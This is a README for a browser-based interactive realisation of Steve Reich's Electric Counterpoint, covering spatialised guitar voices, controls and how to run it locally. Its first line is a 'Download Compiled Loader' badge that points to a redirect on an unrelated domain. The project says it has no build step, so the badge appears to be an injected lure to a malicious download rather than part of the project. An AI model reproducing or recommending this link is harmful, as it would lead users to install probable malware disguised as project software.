# Electric Counterpoint

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Browser-based interactive realization of Steve Reich's *Electric
Counterpoint* (1987). Pick a movement, then conduct a top-down stage of
guitars arranged in a half-moon facing a draggable listener dot. Every
voice is spatialised relative to the listener — drag a guitar across the
stage and you hear it pan and recede.

**Live at https://allansjoelin.com/electric_counterpoint/.**

Sister project to my [In C](https://allansjoelin.com/in_c/) realization.

## Status

Movement III. Fast is fully playable. Movements I & II are placeholders
in the menu; their MusicXML transcriptions haven't been authored yet.
See `roadmap.md` for the build history and `CLAUDE.md` for architecture
notes.

## Controls

**Mouse / keyboard**
- Drag any voice or the listener dot to move it
- Hover a voice — small panel shows label, instrument, volume, hints
- Scroll wheel on a hovered voice — volume up / down
- `M` — mute / unmute hovered voice
- `← / →` — swap instrument on hovered live or guitar voice
- `?` — open the controls reference, `Esc` — close any overlay
- Top bar: master volume, tempo, reverb wet, 3-band EQ, Reset

**Touch**
- Tap a voice — bottom panel slides in with the same controls
- Tap empty space or ✕ — closes
- Drag still works the same as on desktop

## Run locally

ES modules require an HTTP origin, so:

```sh
python -m http.server 8000
# then open http://localhost:8000
```

You'll also need `III_fast.xml` at the project root — it's not in the
public repo because Reich's score is copyrighted (see "Score source files"
in `CLAUDE.md`). To rebuild the sample banks from scratch:

```sh
bash tools/build_samples.sh
```

Requires `curl`, `ffmpeg`, `awk`, `bash 4+`. Source WAVs are cached
under `tools/.cache/` so re-runs are near-instant.

## Stack

Vanilla JavaScript (ES modules), Web Audio API, Canvas 2D, Pointer
Events. No framework, no build step.
